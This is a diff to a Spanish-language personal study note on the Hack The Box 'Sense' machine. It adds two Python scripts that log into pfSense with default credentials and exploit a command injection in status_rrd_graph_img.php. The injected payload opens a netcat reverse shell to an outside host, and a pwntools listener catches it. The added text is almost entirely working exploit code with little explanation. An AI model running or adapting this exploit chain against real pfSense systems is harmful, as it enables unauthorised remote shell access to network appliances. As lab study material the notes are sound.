@@ -94,11 +94,112 @@ printf '\164\157\165\143\150\040\057\164\155\160\057\060\170\144\146' | xargs ec
 > https://0xdf.gitlab.io/2021/03/11/htb-sense.html
 
 
+## Script 
+
+De este script aprendi como poner break points (pdb.set_trace()) tambien usar el sleep y poner como una especie de nc a la escucha con pwn. Ojo en la payload escape los \ por eso van 2.
+
+```python
+#!/usr/bin/python3
+
+#pip uninstall pyelftools -y
+#pip install pyelftools==0.29
+
+from pwn import * 
+
+import requests
+import pdb# break point
+import signal#USas signal para capturar el CTRL+C
+import sys
+import urllib3, threading
+import time# aqui se usa time.sleep
+import re # explresiones regulares
+
+def def_handler(sig, frame):
+        print("\n\n[!] Saliendo...\n")
+        sys.exit(1)
+
+
+#CTRL+C
+signal.signal(signal.SIGINT, def_handler)
+
+main_url="https://10.129.91.150/index.php"
+rce_url="""https://10.129.91.150/status_rrd_graph_img.php?database=queues;guion=$(printf "\\055");ampersand=$(printf "\\046");echo $ampersand;rm ${HOME}tmp${HOME}f;mkfifo ${HOME}tmp${HOME}f;cat ${HOME}tmp${HOME}f|${HOME}bin${HOME}sh ${guion}i 2>${ampersand}1|nc 10.10.14.94 443 >${HOME}tmp${HOME}f"""
+lport=443
+#proxy_url = "http://127.0.0.1:8080"
+
+
+def executeCommand():
+        s=requests.session()
+        urllib3.disable_warnings()
+        s.verify = False
+        r = s.get(main_url)#,proxies=proxies)
+        #pdb.set_trace()#break point
+        #print(r.text)<
+        
+        csrfToken = re.findall(r'name=\'__csrf_magic\' value="(.*?)"', r.text)[0]
+        
+        #print(csrfToken)
+
+        post_data = {'__csrf_magic': csrfToken,'usernamefld':'rohit','passwordfld':'pfsense','login':'Login'}
+        r= s.post(main_url,data=post_data)#,proxies=proxies)
+        #pdb.set_trace()
+        r=s.get(rce_url)
+        #pdb.set_trace()
 
 
 
+if __name__== '__main__':
+#       time.sleep(10)
+        try:
+                print("Hola Mundo")
+                threading.Thread(target=executeCommand, args=()).start()
+        except Exception as e:
+                log.error(str(e))
+        shell=listen(lport,timeout=20).wait_for_connection()
+        shell.interactive() 
+```
+
+Para usar requests con un proxy lo hice asi
+
+```python
+
+#!/usr/bin/python3
 
 
+import requests
+import pdb# break point
+import signal#USas signal para capturar el CTRL+C
+import sys
+import urllib3
+import time# aqui se usa time.sleep
+import re # explresiones regulares
+
+main_url="https://10.129.91.150/index.php"
+rce_url="""https://10.129.91.150/status_rrd_graph_img.php?database=queues;guion=$(printf "\\055");ampersand=$(printf "\\046");echo $ampersand;rm ${HOME}tmp${HOME}f;mkfifo ${HOME}tmp${HOME}f;cat ${HOME}tmp${HOME}f|${HOME}bin${HOME}sh ${guion}i 2>${ampersand}1|nc 10.10.14.94 443 >${HOME}tmp${HOME}f"""
+
+proxies = {
+   'http': 'http://127.0.0.1:8080',
+   'https': 'http://127.0.0.1:8080'
+}
+
+s=requests.session()
+urllib3.disable_warnings()
+s.verify = False
+
+r=s.get(main_url, proxies=proxies)
+#pdb.set_trace()
+csrfToken = re.findall(r'name=\'__csrf_magic\' value="(.*?)"', r.text)[0]
+post_data = {'__csrf_magic': csrfToken,'usernamefld':'rohit','passwordfld':'pfsense','login':'Login'}
+#print(post_data)
+r= s.post(main_url,data=post_data,proxies=proxies)
+
+
+try:
+	r=s.get(rce_url,proxies=proxies)
+except Exeption as e:
+	log.error(str(e))
+
+```
 
 
 
